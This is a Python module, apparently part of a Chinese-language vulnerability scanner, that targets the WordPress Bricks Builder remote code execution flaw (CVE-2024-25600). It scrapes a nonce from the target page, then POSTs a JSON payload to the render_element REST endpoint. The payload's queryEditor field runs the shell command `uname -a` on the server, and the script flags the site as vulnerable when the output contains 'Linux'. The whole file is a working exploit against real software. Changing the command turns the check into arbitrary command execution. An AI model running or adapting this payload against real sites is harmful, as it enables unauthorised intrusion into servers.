# WordPres_Bricks_Builder_scan.py

import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import json
import ssl
import urllib
from urllib.parse import urljoin, quote

bugName="WordPres Bricks Builder 前台RCE漏洞(CVE-2024-25600)"
def scan_WordPres_Bricks_Builder(url, proxies, headers, append_to_output, serverJ,bugName):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }

    encodetext = url

    try:

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
        res = req.text

        match = re.search(r'"nonce":"([^"]+)"', res)
        if match:
            nonce_value = match.group(1)
            print(nonce_value)  # 输出 64371ad630
            append_to_output(f"[+] nonce_value: {nonce_value} ", "red")
            path = "/wp-json/bricks/v1/render_element"

            if not url.startswith('http://') and not url.startswith('https://'):
                url = 'http://' + url

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'Accept': '*/*',
                'Content-Type': 'application/json'
            }

            data = {
                "postId": "1",
                "nonce": nonce_value,
                "element": {
                    "name": "container",
                    "settings": {
                        "hasLoop": "true",
                        "query": {
                            "useQueryEditor": True,
                            "queryEditor": "throw new Exception(`uname -a`);",
                            "objectType": "post"
                        }
                    }
                }
            }

            encodetext1 = url + path
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            req1 = requests.post(encodetext1, data=json.dumps(data), headers=headers, verify=False, timeout=20,
                                 proxies=proxies)

            if req1.status_code == 200 and 'Linux' in req1.text:
                append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                ServerJ.sc_send({bugName},
                                f"漏洞连接: {url}\r\n漏洞类型: RCE漏洞", ServerJ_switch=serverJ)
            else:
                append_to_output(f"[-] {url} 不存在{bugName}", "green")
        else:
            append_to_output(f"[-] {url} 不存在nonce_value", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
